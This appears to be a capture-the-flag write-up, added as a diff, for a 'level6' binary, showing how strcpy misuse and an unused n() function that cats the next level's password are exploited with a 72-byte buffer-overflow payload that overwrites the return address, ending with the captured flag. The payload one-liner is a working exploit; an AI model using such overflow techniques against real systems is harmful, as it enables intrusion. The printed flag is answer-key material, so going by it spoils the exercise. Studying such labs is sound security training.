@@ -1,0 +1,37 @@
+- We run the program for the first time without arguments and we got a Segmentation fault
+
+$> ./level6
+Segmentation fault (core dumped)
+
+- We run it with test arg. we got a response
+
+$> ./level6 Heloooo
+Nope
+
+- Also we tried with a long arg.
+
+$> ./level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+
+- After disassembling the main function we found that it calls the strcpy with the arg.
+
+*This a security considerations in the strcpy man:
+The strcpy() function is easily misused in a manner which enables malicious users to arbitrarily change a running programs functionality through a buffer overflow attack.
+
+- Also we found an unused function called n()
+
+(gdb) info func
+[...]
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+[...]
+
+- After disassembling the n() function we found that it calls the system function with this argument ("/bin/cat /home/user/level7/.pass"). so we will use it to exploit the program.
+
+- We calculated the buffer size like previous levels, and we found = 72
+
+- Now, we need to make the payload for exploiting.
+
+$> ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
